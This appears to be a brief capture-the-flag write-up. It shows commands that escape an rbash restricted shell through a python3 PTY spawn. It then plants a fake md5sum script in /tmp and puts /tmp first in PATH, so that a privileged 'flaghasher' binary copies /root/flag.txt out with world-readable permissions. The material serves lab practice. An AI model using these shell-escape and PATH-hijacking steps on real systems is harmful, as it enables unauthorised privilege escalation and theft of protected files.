> This is very similar to the preious challenge, but with the complication that we do not know where the flaghasher binary is on the filesystem, and we are initially using an rbash "jail" shell.

```
find / -name flaghasher 2>/dev/null
which python
which python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
find / -name flaghasher 2>/dev/null
echo 'cat /root/flag.txt > /tmp/flag.txt && chmod 777 /tmp/flag.txt' > /tmp/md5sum
export PATH=/tmp:$PATH
chmod 777 /tmp/md5sum
./flaghasher
cat /tmp/flag.txt
```

Finis
